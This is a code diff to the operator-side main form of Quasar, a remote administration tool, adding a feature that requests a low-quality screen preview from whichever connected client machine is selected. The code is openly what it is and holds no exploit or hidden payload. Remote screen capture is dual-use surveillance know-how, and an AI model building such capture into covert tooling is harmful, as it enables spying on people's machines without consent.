@@ -3,6 +3,7 @@ using Quasar.Common.Messages;
 using Quasar.Common.Messages.Administration.Actions;
 using Quasar.Common.Messages.ClientManagement;
 using Quasar.Common.Messages.FunStuff;
+using Quasar.Common.Messages.Preview;
 using Quasar.Common.Messages.UserSupport.MessageBox;
 using Quasar.Common.Messages.UserSupport.Website;
 using Quasar.Server.Extensions;
@@ -13,12 +14,13 @@ using Quasar.Server.Networking;
 using Quasar.Server.Utilities;
 using System;
 using System.Collections.Generic;
-using System.IO;
+using System.Diagnostics;
 using System.Linq;
 using System.Net.Sockets;
 using System.Security.Cryptography.X509Certificates;
 using System.Threading;
 using System.Windows.Forms;
+using System.IO;
 
 namespace Quasar.Server.Forms
 {
@@ -37,6 +39,9 @@ namespace Quasar.Server.Forms
         private readonly object _processingClientConnectionsLock = new object();
         private readonly object _lockClients = new object(); // lock for clients-listview
 
+        private GetPreviewImageHandler _previewImageHandler;
+
+
         public FrmMain()
         {
             _clientStatusHandler = new ClientStatusHandler();
@@ -54,6 +59,7 @@ namespace Quasar.Server.Forms
             _clientStatusHandler.StatusUpdated += SetStatusByClient;
             _clientStatusHandler.UserStatusUpdated += SetUserStatusByClient;
             _clientStatusHandler.UserActiveWindowStatusUpdated += SetUserActiveWindowByClient;
+            //MessageHandler.Register(new GetPreviewImageHandler());
         }
 
         /// <summary>
@@ -190,14 +196,44 @@ namespace Quasar.Server.Forms
         {
             ListenServer.Disconnect();
             UnregisterMessageHandler();
+            if (_previewImageHandler != null)
+            {
+                MessageHandler.Unregister(_previewImageHandler);
+                _previewImageHandler.Dispose();
+            }
             notifyIcon.Visible = false;
             notifyIcon.Dispose();
         }
 
         private void lstClients_SelectedIndexChanged(object sender, EventArgs e)
         {
+
             UpdateWindowTitle();
+
+            var selectedClients = GetSelectedClients();
+            if (selectedClients.Length == 1)
+            {
+                if (_previewImageHandler != null)
+                {
+                    MessageHandler.Unregister(_previewImageHandler);
+                    _previewImageHandler.Dispose();
+                }
+
+                _previewImageHandler = new GetPreviewImageHandler(selectedClients[0], pictureBoxMain);
+                MessageHandler.Register(_previewImageHandler);
+
+                GetPreviewImage image = new GetPreviewImage
+                {
+                    Quality = 20,
+                    DisplayIndex = 0
+                };
+
+                Debug.WriteLine("sending message!!!!!!!!!!!!!!!!!!!!");
+
+                selectedClients[0].Send(image);
+            }
         }
+
 
         private void ServerState(Networking.Server server, bool listening, ushort port)
         {
@@ -454,15 +490,6 @@ namespace Quasar.Server.Forms
             });
 
             return clients.ToArray();
-        }
-
-        /// <summary>
-        /// Gets all connected clients.
-        /// </summary>
-        /// <returns>An array of all connected Clients.</returns>
-        private Client[] GetConnectedClients()
-        {
-            return ListenServer.ConnectedClients;
         }
 
         /// <summary>
